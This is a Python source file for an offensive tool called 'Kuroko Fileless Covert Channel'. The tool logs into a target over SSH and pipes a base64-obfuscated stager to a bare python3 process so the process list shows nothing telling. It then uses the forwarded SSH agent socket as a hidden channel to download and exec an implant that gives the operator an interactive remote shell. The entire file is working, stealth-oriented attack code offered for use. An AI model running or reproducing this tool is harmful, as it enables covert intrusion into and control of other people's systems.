import paramiko
import time
import threading
import struct
import base64
import json
import argparse
import sys
import os
import getpass

"""
      KK   KK    UU   UU    RRRRRR      OOOOO     KK   KK    OOOOO
      KK  KK     UU   UU    RR   RR    OO   OO    KK  KK    OO   OO
      KK KK      UU   UU    RR   RR    OO   OO    KK KK     OO   OO
      KKKK       UU   UU    RRRRRR     OO   OO    KKKK      OO   OO
      KK KK      UU   UU    RR RR      OO   OO    KK KK     OO   OO
      KK  KK     UU   UU    RR  RR     OO   OO    KK  KK    OO   OO
      KK   KK     UUUUU     RR   RR     OOOOO     KK   KK    OOOOO

      Copyright (c) 2026 ShotokanZH
"""

IMPLANT_CODE = r"""
import subprocess
import sys
import os
import struct
import json
import getpass

try:
    s.send(b'[+] Implant loaded.\n')
except Exception:
    sys.exit(1)

while True:
    try:
        data = s.recv(4096)
        if not data: break
        
        cmd = data.decode().strip()
        if cmd == 'terminate': break
        
        output = ""
        
        if cmd.startswith("cd"):
            try:
                target = cmd[3:].strip()
                if not target:
                    target = os.path.expanduser("~")
                os.chdir(target)
            except Exception as e:
                output = f"[-] Error changing directory: {e}"
        else:
            try:
                res = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                output = res.decode(errors='replace')
            except subprocess.CalledProcessError as e:
                output = str(e.output.decode(errors='replace'))
            except Exception as e:
                output = str(e)

        response_data = {
            "out": output,
            "cwd": os.getcwd(),
            "usr": getpass.getuser()
        }
        
        json_bytes = json.dumps(response_data).encode()
        length_header = struct.pack('!I', len(json_bytes))
        s.send(length_header + json_bytes)
        
    except Exception as e:
        err = json.dumps({"out": f"Critical Loop Error: {e}", "cwd": "?", "usr": "?"}).encode()
        s.send(struct.pack('!I', len(err)) + err)
        break
s.close()
"""

def recv_exact(channel, n_bytes):
    data = b''
    while len(data) < n_bytes:
        chunk = channel.recv(n_bytes - len(data))
        if not chunk: raise EOFError("Socket closed mid-read")
        data += chunk
    return data

def covert_loop(channel):
    try:
        print("[*] Socket connection received")
        
        channel.settimeout(10)
        buffer = b''
        while b'READY\n' not in buffer:
            chunk = channel.recv(1024)
            if not chunk: return
            buffer += chunk
        
        print("[*] Sending payload...")
        channel.sendall(IMPLANT_CODE.encode())
        
        confirmation = ""
        while "[+] Implant loaded" not in confirmation:
            chunk = channel.recv(1024).decode()
            confirmation += chunk
        print(f"[+] Target confirmed: {confirmation.strip()}")
        
        print("-" * 60)
        channel.settimeout(None)
        
        prompt_str = "Remote Shell> " 
        
        while True:
            try:
                cmd = input(prompt_str)
                if not cmd: continue
                if cmd.lower() == 'exit':
                    channel.sendall(b'terminate')
                    break
                
                channel.sendall(cmd.encode())
                
                try:
                    length_bytes = recv_exact(channel, 4)
                except EOFError:
                    print("[-] Connection lost.")
                    break
                    
                msg_len = struct.unpack('!I', length_bytes)[0]
                
                if msg_len > 0:
                    json_raw = recv_exact(channel, msg_len)
                    response = json.loads(json_raw.decode())
                    
                    if response['out']:
                        print(response['out'])
                    
                    user = response.get('usr', 'unknown')
                    cwd = response.get('cwd', 'unknown')
                    prompt_str = f"{user}:{cwd} Shell> "
                    
                else:
                    print("(Empty response)")
                    
            except KeyboardInterrupt:
                print("\nType 'exit' to close cleanly.")
            except json.JSONDecodeError:
                print("[-] Error decoding response.")
                
    except Exception as e:
        print(f"[-] Session Error: {e}")
    finally:
        channel.close()

def parse_args():
    parser = argparse.ArgumentParser(description="Kuroko Fileless Covert Channel")
    parser.add_argument("host", help="Target IP address")
    parser.add_argument("-u", "--user", required=True, help="SSH Username")
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument("-p", "--password", help="SSH Password")
    auth_group.add_argument("-k", "--key", help="Path to SSH Private Key")
    return parser.parse_args()

def main():
    print("Initializing Kuroko...")
    args = parse_args()
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    print(f"[*] Connecting to {args.host}...")
    
    try:
        if args.key:
            client.connect(args.host, username=args.user, key_filename=args.key)
        else:
            client.connect(args.host, username=args.user, password=args.password)
    except Exception as e:
        print(f"[-] SSH Connection failed: {e}")
        return

    transport = client.get_transport()
    session = transport.open_session()
    
    def agent_handler(channel):
        threading.Thread(target=covert_loop, args=(channel,), daemon=True).start()
    
    session.request_forward_agent(agent_handler)
    
    stager_source = """
import socket, os, sys
path = os.environ.get('SSH_AUTH_SOCK')
s = socket.socket(socket.AF_UNIX)
s.connect(path)
s.send(b'READY\\n')
code = s.recv(8192)
exec(code, {'s': s, 'socket': socket, 'sys': sys, 'os': os})
"""
    stager_b64 = base64.b64encode(stager_source.encode()).decode()
    
    # We embed the payload inside a valid Python one-liner script.
    # This prevents the remote python interpreter from choking on raw Base64 syntax errors.
    # The process list will simply show: "python3"
    loader_payload = f"import base64,sys;exec(base64.b64decode('{stager_b64}'))"
    
    print(f"[*] Injecting stager via STDIN (Covert Mode)...")
    
    # Execute plain python3 without arguments
    session.exec_command("python3")
    
    # Send the code to its stdin
    session.sendall(loader_payload)
    session.shutdown_write()
    print("[*] Stager injected.")

    def monitor_session():
        while not session.closed:
            if session.recv_stderr_ready():
                print(f"[REMOTE STDERR] {session.recv_stderr(1024).decode()}")
            time.sleep(1)
            
    threading.Thread(target=monitor_session, daemon=True).start()

    try:
        while not session.closed:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Closing connection.")
        client.close()

if __name__ == '__main__':
    main()